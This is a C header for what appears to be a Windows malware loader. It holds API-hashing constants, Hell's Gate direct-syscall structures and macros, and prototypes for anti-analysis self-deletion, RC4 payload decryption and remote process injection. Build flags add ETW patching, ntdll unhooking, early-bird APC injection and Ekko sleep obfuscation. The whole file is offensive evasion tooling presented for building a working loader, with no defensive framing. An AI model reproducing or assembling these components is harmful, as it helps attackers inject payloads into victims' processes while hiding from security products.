/*
	header file that contains the function's prototypes and other needed values.
	In addition to the API_HASHING & VX_TABLE structures definitions

*/

#pragma once


#include <Windows.h>

#ifndef COMMON_H
#define COMMON_H

// contains the defintions of the WinAPIs used
#include "typedef.h"

//--------------------------------------------------------------------------------------------------------------------------
// from AntiAnalysis.c

// monitor mouse clicks for 20 seconds
#define MONITOR_TIME   20000 

// the new data stream name
#define NEW_STREAM L":Maldev"

/*
	function that execute a group of Anti-Analysis functions :
		- Self Deletion
		- Monitoring User Interaction Of Mouse-Clicks
*/
BOOL AntiAnalysis(DWORD dwMilliSeconds);


//--------------------------------------------------------------------------------------------------------------------------
// 'hasher.exe' output - hash values of syscalls/winapis functions

#define NtQuerySystemInformation_JOAA			0x7B9816D6
#define NtCreateSection_JOAA					0x192C02CE
#define NtMapViewOfSection_JOAA					0x91436663
#define NtUnmapViewOfSection_JOAA				0x0A5B9402
#define NtClose_JOAA							0x369BD981
#define NtCreateThreadEx_JOAA					0x8EC0B84A
#define NtWaitForSingleObject_JOAA				0x6299AD3D
#define NtDelayExecution_JOAA					0xB947891A

#define GetTickCount64_JOAA						0x00BB616E
#define OpenProcess_JOAA						0xAF03507E
#define CallNextHookEx_JOAA						0xB8B1ADC1
#define SetWindowsHookExW_JOAA					0x15580F7F
#define GetMessageW_JOAA						0xAD14A009
#define DefWindowProcW_JOAA						0xD96CEDDC
#define UnhookWindowsHookEx_JOAA				0x9D2856D0
#define GetModuleFileNameW_JOAA					0xAB3A6AA1
#define CreateFileW_JOAA						0xADD132CA
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define CloseHandle_JOAA						0x9E5456F2

#define SystemFunction032_JOAA					0x8CFD40A8

// New function hashes
#define NtTraceEvent_JOAA					0x4A46247B
#define NtCreateFile_JOAA					0x184F0CA7
#define NtProtectVirtualMemory_JOAA			0x1DA5BB2B
#define VirtualProtect_JOAA					0x96AC61C9
#define VirtualAlloc_JOAA					0x34115EA6
#define QueueUserAPC_JOAA					0xAAB9F2C3
#define CreateProcessW_JOAA					0x1F3C122B
#define DebugActiveProcessStop_JOAA			0x531845F8
#define WriteProcessMemory_JOAA				0xFD7C9237
#define VirtualAllocEx_JOAA					0xAD56CE7E
#define VirtualProtectEx_JOAA				0xE7C5793F
#define RtlCreateTimerQueue_JOAA			0x746D3653
#define RtlCreateTimer_JOAA					0x73290450
#define RtlDeleteTimerQueue_JOAA			0x90574545
#define NtContinue_JOAA						0x7076F60C
#define NtCreateEvent_JOAA					0xC04687AA
#define NtSignalAndWaitForSingleObject_JOAA	0xD14A4168
#define ResumeThread_JOAA					0xAB12BBDD
#define RtlCaptureContext_JOAA				0xFCB92075
#define EtwEventWrite_JOAA					0xA6223D77
#define WaitForSingleObjectEx_JOAA			0xC3654266
#define SetEvent_JOAA						0xBF1433DF

#define KERNEL32DLL_JOAA						0xFD2AD9BD
#define USER32DLL_JOAA							0x349D72E7
#define NTDLLDLL_JOAA						0x0141C4EE
#define ADVAPI32DLL_JOAA					0xD675A2CB

//--------------------------------------------------------------------------------------------------------------------------
// from WinApi.c

// seed of the HashStringJenkinsOneAtATime32BitA/W funtion in 'WinApi.c'
#define INITIAL_SEED	8

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

CHAR _toUpper(CHAR C);
PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);

//--------------------------------------------------------------------------------------------------------------------------
// from ApiHashing.c

/*
	Api Hashing functions
*/
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

//--------------------------------------------------------------------------------------------------------------------------
// from HellsGate.c

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	UINT32	uHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;


PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(_In_ PVOID pModuleBase, _Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(_In_ PVOID pModuleBase, _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, _In_ PVX_TABLE_ENTRY pVxTableEntry);


extern VOID HellsGate(WORD wSystemCall);
extern NTSTATUS HellDescent();

/* Invoke a direct syscall in a single expression.
 *   STATUS = SYSCALL(g_Sys.NtClose, hSection);
 */
#define SYSCALL(vx, ...)  (HellsGate((vx).wSystemCall), (NTSTATUS)HellDescent(__VA_ARGS__))

/* Declare a local VX_TABLE_ENTRY pre-loaded with its JOAA hash:
 *   DECL_VX(NtCreateFile);   →  VX_TABLE_ENTRY NtCreateFile_e = { .uHash = NtCreateFile_JOAA };
 */
#define DECL_VX(name)     VX_TABLE_ENTRY name##_e = { .uHash = name##_JOAA }

/* Resolve SSN for a DECL_VX entry; returns FALSE on failure:
 *   LOAD_VX(pBase, pDir, NtCreateFile);
 */
#define LOAD_VX(base, dir, name)  \
    if (!GetVxTableEntry((base), (dir), &name##_e)) return FALSE


//--------------------------------------------------------------------------------------------------------------------------
// from inject.c

// KEY_SIZE and HINT_BYTE are defined per-build in loader_config.h

// used to fetch the addresses of the syscalls / WinAPIs used
BOOL InitializeSyscalls();
// used to get the target process handle 
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
// used to inject the payload after decrypting it to the target process
BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal);

BOOL Rc4DecryptPayload(IN PVOID pPayload, IN SIZE_T sSize);

#ifdef ETW_PATCH
BOOL PatchEtw();
#endif

#ifdef UNHOOK_DISK
BOOL UnhookNtdll();
#endif

#ifdef INJECT_EARLY_BIRD
BOOL EarlyBirdInject(IN PBYTE pPayload, IN SIZE_T sSize);
#endif

#ifdef SLEEP_OBF
VOID EkkoSleep(DWORD dwMs);
#endif


//--------------------------------------------------------------------------------------------------------------------------

// structure that will be used to save the WinAPIs addresses
typedef struct _API_HASHING {

	fnGetTickCount64				pGetTickCount64;
	fnOpenProcess					pOpenProcess;
	fnCallNextHookEx				pCallNextHookEx;
	fnSetWindowsHookExW				pSetWindowsHookExW;
	fnGetMessageW					pGetMessageW;
	fnDefWindowProcW				pDefWindowProcW;
	fnUnhookWindowsHookEx			pUnhookWindowsHookEx;
	fnGetModuleFileNameW			pGetModuleFileNameW;
	fnCreateFileW					pCreateFileW;
	fnSetFileInformationByHandle	pSetFileInformationByHandle;
	fnCloseHandle					pCloseHandle;

#ifdef INJECT_EARLY_BIRD
	fnVirtualAllocEx			pVirtualAllocEx;
	fnVirtualProtectEx			pVirtualProtectEx;
	fnWriteProcessMemory		pWriteProcessMemory;
	fnQueueUserAPC				pQueueUserAPC;
	fnCreateProcessW			pCreateProcessW;
	fnDebugActiveProcessStop	pDebugActiveProcessStop;
#endif

}API_HASHING, * PAPI_HASHING;


// structure that will be used to save the Syscalls Information (ssn - hash - address)
typedef struct _VX_TABLE {

	VX_TABLE_ENTRY NtQuerySystemInformation;

	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;

	VX_TABLE_ENTRY NtDelayExecution;

} VX_TABLE, * PVX_TABLE;



#endif // !COMMON_H
